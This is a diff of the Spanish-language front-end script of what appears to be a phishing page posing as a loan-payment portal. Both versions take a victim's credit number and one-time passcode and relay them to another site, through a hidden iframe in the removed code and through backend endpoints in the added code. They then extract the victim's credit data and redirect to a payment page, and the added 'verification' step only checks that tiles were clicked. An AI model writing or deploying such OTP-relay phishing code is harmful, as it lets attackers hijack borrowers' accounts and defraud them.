-// ============================================================
-function updateStepper(n) {
-    for (let i = 1; i <= 3; i++) {
-        const el = document.getElementById('stepItem' + i);
-        el.classList.remove('active', 'completed');
-        el.querySelector('.step-circle').textContent = i;
-        if (i < n) { el.classList.add('completed'); el.querySelector('.step-circle').textContent = '✓'; }
-        else if (i === n) el.classList.add('active');
-    }
-}
-function hideAllSteps() {
-    ['formStep1','formStep2','formStep3','formStepResult'].forEach(id =>
-        document.getElementById(id).classList.remove('visible'));
-}
-function showStep(name) {
-    hideAllSteps();
-    document.getElementById(name).classList.add('visible');
-    const map = { formStep1:1, formStep2:2, formStep3:3, formStepResult:3 };
-    updateStepper(map[name] || 1);
-}
-
-// ============================================================
-// INPUT CRÉDITO
-// ============================================================
-document.getElementById('creditNumber').addEventListener('input', function () {
-    const btn = document.getElementById('btnStart');
-    if (this.value.trim()) { btn.classList.add('active'); btn.disabled = false; }
-    else { btn.classList.remove('active'); btn.disabled = true; }
-});
-
-document.getElementById('btnStart').addEventListener('click', function() {
-    enviarCredito();
-});
-
-// ============================================================
-// ENVIAR CRÉDITO AL IFRAME
-// ============================================================
-function enviarCredito() {
-    const credit = document.getElementById('creditNumber').value.trim();
-    if (!credit) return;
-
-    const fdoc = getIframeDoc();
-    if (!fdoc) {
-        showMsg('Error de conexión. Recarga la página.', 'error');
-        return;
-    }
-
-    // Buscar input de crédito en el iframe
-    const input = fdoc.querySelector('#otp-contract')
-        || fdoc.querySelector('input[formcontrolname="idProcess"]')
-        || fdoc.querySelector('input[type="text"]');
-
-    if (!input) {
-        showMsg('No se encontró el campo de crédito. Espera a que cargue.', 'error');
-        return;
-    }
-
-    // Llenar crédito con método compatible Angular
-    fillAngularInput(input, credit);
-
-    // Click en Continuar del iframe
-    setTimeout(() => {
-        const btn = findButtonByText(fdoc, 'continuar');
-        if (btn) {
-            btn.click();
-            console.log('[IFRAME] Click en Continuar');
-            currentStep = 'captcha-wait';
-        } else {
-            console.log('[IFRAME] Botón Continuar no encontrado');
+            document.getElementById('line1').className = 'step-line';
+            document.getElementById('line2').className = 'step-line';
+            for (let i = 1; i <= 3; i++) {
+                if (i < step) { document.getElementById('sc'+i).className = 'step-circle done'; document.getElementById('sc'+i).innerHTML = '✓'; }
+                else if (i === step) { document.getElementById('sc'+i).className = 'step-circle active'; document.getElementById('sl'+i).className = 'step-label active'; }
+            }
+            if (step > 1) document.getElementById('line1').className = 'step-line done';
+            if (step > 2) document.getElementById('line2').className = 'step-line done';
         }
-    }, 300);
-}
 
-function fillAngularInput(input, value) {
-    // Usar el setter nativo para que Angular detecte el cambio
-    const nativeSetter = Object.getOwnPropertyDescriptor(
-        window.HTMLInputElement.prototype, 'value'
-    ).set;
+        async function startProcess() {
+            const credit = document.getElementById('creditInput').value.trim();
+            if (!credit) { showError('Ingresa tu número de crédito'); return; }
+            const selected = document.querySelectorAll('.captcha-tile.selected');
+            if (selected.length === 0) { showError('Completa la verificación de seguridad'); return; }
 
-    input.focus();
-    nativeSetter.call(input, value);
-    input.dispatchEvent(new Event('input', { bubbles: true }));
-    input.dispatchEvent(new Event('change', { bubbles: true }));
-    input.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true }));
-    input.blur();
-}
-
-function findButtonByText(doc, text) {
-    const buttons = doc.querySelectorAll('button');
-    for (const btn of buttons) {
-        if (btn.innerText.trim().toLowerCase().includes(text.toLowerCase())) {
-            return btn;
+            showStep('step1Loading');
+            try {
+                const resp = await fetch(API + '/api/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ creditNumber: credit })
+                });
+                const data = await resp.json();
+                if (!data.success) throw new Error(data.error || 'Error al procesar');
+                currentSession = data.sessionId;
+                const container = document.getElementById('otpOptions');
+                container.innerHTML = '';
+                if (data.otpOptions && data.otpOptions.length > 0) {
+                    data.otpOptions.forEach((opt, i) => {
+                        const icon = opt.type === 'sms' ? '📱' : '📧';
+                        const card = document.createElement('div');
+                        card.className = 'otp-card';
+                        card.innerHTML = '<div class="icon">'+icon+'</div><div class="info"><strong>'+opt.label+'</strong><span>'+(opt.type==='sms'?'Mensaje de texto':'Correo electrónico')+'</span></div>';
+                        card.onclick = () => {
+                            document.querySelectorAll('.otp-card').forEach(c => c.classList.remove('selected'));
+                            card.classList.add('selected');
+                            selectedOtpIndex = opt.index;
+                            document.getElementById('btnStep2').disabled = false;
+                        };
+                        container.appendChild(card);
+                    });
+                    updateStepper(2); showStep('step2');
+                } else { updateStepper(3); showStep('step3'); }
+            } catch (err) { showError(err.message); showStep('step1'); }
         }
-    }
-    return null;
-}
 
-// ============================================================
-// CAPTCHA RESUELTO
-// ============================================================
-function onCaptchaSolved() {
-    // Ocultar iframe del CAPTCHA
-    frame.style.opacity = '0';
-    frame.style.pointerEvents = 'none';
-
-    // Esperar a que aparezcan opciones OTP o datos
-    showMsg('Verificación completada. Procesando...', 'info');
-}
-
-// ============================================================
-// PASO 2: Opciones OTP
-// ============================================================
-function renderOtpOptions(options) {
-    otpOptionsList = options;
-    selectedOtpOption = null;
-    const container = document.getElementById('otpOptionsContainer');
-    container.innerHTML = '';
-
-    options.forEach((opt, i) => {
-        const card = document.createElement('div');
-        card.className = 'otp-option-card';
-        const labelLow = opt.label.toLowerCase();
-        let icon = '📱', desc = 'Recibe un SMS a tu celular registrado';
-        if (labelLow.includes('correo') || labelLow.includes('email') || labelLow.includes('mail')) {
-            icon = '✉️'; desc = 'Recibe un código a tu correo electrónico';
+        async function selectOtp() {
+            if (selectedOtpIndex === null) { showError('Selecciona un método'); return; }
+            showStep('step2Loading');
+            try {
+                const resp = await fetch(API + '/api/select-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId: currentSession, optionIndex: selectedOtpIndex }) });
+                const data = await resp.json();
+                if (!data.success) throw new Error(data.error || 'Error al enviar OTP');
+                updateStepper(3); showStep('step3');
+            } catch (err) { showError(err.message); showStep('step2'); }
         }
-        card.innerHTML = '<div class="opt-icon">' + icon + '</div>' +
-            '<div class="opt-label">' + esc(opt.label) + '</div>' +
-            '<div class="opt-desc">' + desc + '</div>';
-        card.onclick = function() {
-            document.querySelectorAll('.otp-option-card').forEach(c => c.classList.remove('selected'));
-            card.classList.add('selected');
-            selectedOtpOption = i;
-            document.getElementById('btnSendOtp').classList.add('active');
-            document.getElementById('btnSendOtp').disabled = false;
-        };
-        container.appendChild(card);
-    });
-}
 
-function seleccionarMetodoOtp() {
-    if (selectedOtpOption === null) return;
-    const opt = otpOptionsList[selectedOtpOption];
-    const btn = document.getElementById('btnSendOtp');
-    btn.disabled = true;
-
-    const fdoc = getIframeDoc();
-    if (!fdoc) { showMsg('Error de conexión', 'error'); btn.disabled = false; return; }
-
-    // Hacer click en la opción dentro del iframe
-    if (opt.element) {
-        opt.element.click();
-        // También buscar y clickear el label interno
-        const lbl = opt.element.querySelector('label, .mat-radio-label');
-        if (lbl) lbl.click();
-    }
-
-    // Click en el botón de enviar del iframe
-    setTimeout(() => {
-        const sendBtn = findButtonByText(fdoc, 'enviar') || findButtonByText(fdoc, 'continuar');
-        if (sendBtn) sendBtn.click();
-
-        const labelLow = opt.label.toLowerCase();
-        let medio = 'celular o correo';
-        if (labelLow.includes('correo') || labelLow.includes('email') || labelLow.includes('mail')) medio = 'correo electrónico';
-        else if (labelLow.includes('sms') || labelLow.includes('celular') || labelLow.includes('mensaje')) medio = 'celular';
-
-        document.getElementById('otpSentMsg').textContent = 'Paso 3 de 3 — Ingresa el código que recibiste en tu ' + medio + '.';
-        document.getElementById('otpHintText').textContent = 'El código fue enviado a tu ' + medio + ' registrado.';
-        showStep('formStep3');
-        currentStep = 'otp-code';
-        showMsg('Código enviado a tu ' + medio + ' registrado.', 'info');
-        btn.disabled = false;
-    }, 500);
-}
-
-// ============================================================
-// PASO 3: Verificar OTP
-// ============================================================
-function enviarOtp() {
-    const code = document.getElementById('otpCode').value.trim();
-    if (!code) return showMsg('Ingresa el código', 'error');
-
-    const btnV = document.getElementById('btnVerify');
-    btnV.disabled = true;
-
-    const fdoc = getIframeDoc();
-    if (!fdoc) { showMsg('Error de conexión', 'error'); btnV.disabled = false; return; }
-
-    // Buscar input de OTP en el iframe
-    const otpInput = fdoc.querySelector('input[formcontrolname="otp"]')
-        || fdoc.querySelector('input[type="tel"]')
-        || fdoc.querySelector('input[maxlength="6"]')
-        || fdoc.querySelector('input[inputmode="numeric"]');
-
-    if (otpInput) {
-        fillAngularInput(otpInput, code);
-    }
-
-    // Click en Verificar
-    setTimeout(() => {
-        const verBtn = findButtonByText(fdoc, 'verificar') || findButtonByText(fdoc, 'validar');
-        if (verBtn) verBtn.click();
-
-        // Esperar a que aparezcan los datos del crédito
-        showMsg('Verificando código...', 'info');
-    }, 300);
-
-    // Después de un momento, verificar si llegaron datos
-    setTimeout(() => {
-        const creditData = findCreditData(fdoc);
-        if (creditData) {
-            onCreditDataFound(creditData);
-        } else {
-            btnV.disabled = false;
-            // Seguir monitoreando
+        async function verifyOtp() {
+            const code = document.getElementById('otpInput').value.trim();
+            if (!code) { showError('Ingresa el código'); return; }
+            showStep('step3Loading');
+            try {
+                const resp = await fetch(API + '/api/verify-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId: currentSession, code }) });
+                const data = await resp.json();
+                if (!data.success) throw new Error(data.error || 'Código inválido');
+                const extResp = await fetch(API + '/api/extract', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId: currentSession }) });
+                const extData = await extResp.json();
+                if (extData.success && extData.data) {
+                    sessionStorage.setItem('creditData', JSON.stringify(extData.data));
+                    sessionStorage.setItem('sessionId', currentSession);
+                    window.location.href = 'pago.html';
+                } else { throw new Error('No se pudieron extraer los datos'); }
+            } catch (err) { showError(err.message); showStep('step3'); }
         }
-    }, 5000);
-}
 
-// ============================================================
-// DATOS DEL CRÉDITO → REDIRIGIR A pago.html
-// ============================================================
-function onCreditDataFound(data) {
-    if (observerInterval) clearInterval(observerInterval);
-    currentStep = 'done';
-
-    try {
-        sessionStorage.setItem('mobilize_credit', JSON.stringify(data));
-    } catch(e) {}
-
-    // Mostrar resultado y luego redirigir
-    showStep('formStepResult');
-    showMsg('', '');
-    document.getElementById('resultData').innerHTML =
-        '<div style="background:#f8f9fa;border-radius:10px;padding:20px">' +
-        '<h4 style="font-size:14px;color:#242833;margin-bottom:10px">Datos del crédito</h4>' +
-        '<pre style="white-space:pre-wrap;word-break:break-word;font-size:12px;font-family:Courier New,monospace;max-height:300px;overflow-y:auto">' +
-        esc(data.text || 'Sin datos') + '</pre></div>';
-
-    // Redirigir a pago.html después de 2s
-    setTimeout(() => {
-        window.location.href = '/app/pago.html';
-    }, 2000);
-}
-
-// ============================================================
-// UTILIDADES
-// ============================================================
-function resetAll() {
-    if (observerInterval) clearInterval(observerInterval);
-    captchaFound = false;
-    captchaSolved = false;
-    selectedOtpOption = null;
-    otpOptionsList = [];
-    iframeReady = false;
-    currentStep = 'credit';
-    document.getElementById('creditNumber').value = '';
-    document.getElementById('otpCode').value = '';
-    document.getElementById('otpOptionsContainer').innerHTML = '';
-    showStep('formStep1');
-    showMsg('', '');
-    document.getElementById('btnStart').classList.remove('active');
-    document.getElementById('btnStart').disabled = true;
-
-    // Recargar iframe
-    const clip = document.getElementById('iframeClip');
-    if (frame) frame.remove();
-    document.getElementById('iframeLoading').style.display = 'flex';
-    initIframe();
-}
-
-function showMsg(m, t) {
-    const el = document.getElementById('resultMsg');
-    if (!m) { el.innerHTML = ''; return; }
-    el.innerHTML = '<div class="result-box ' + t + '">' + m + '</div>';
-}
-function esc(t) { return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-
-// ============================================================
-// INIT
-// ============================================================
-window.addEventListener('load', function() {
-    initIframe();
-
-    if (window.innerWidth <= 900) {
-        setTimeout(function() {
-            document.getElementById('formStep1').scrollIntoView({ behavior: 'smooth', block: 'start' });
-        }, 300);
-    }
-});
-</script>
+        document.getElementById('creditInput').addEventListener('keydown', e => { if (e.key === 'Enter') startProcess(); });
+        document.getElementById('otpInput').addEventListener('keydown', e => { if (e.key === 'Enter') verifyOtp(); });
+    </script>
 </body>
 </html>
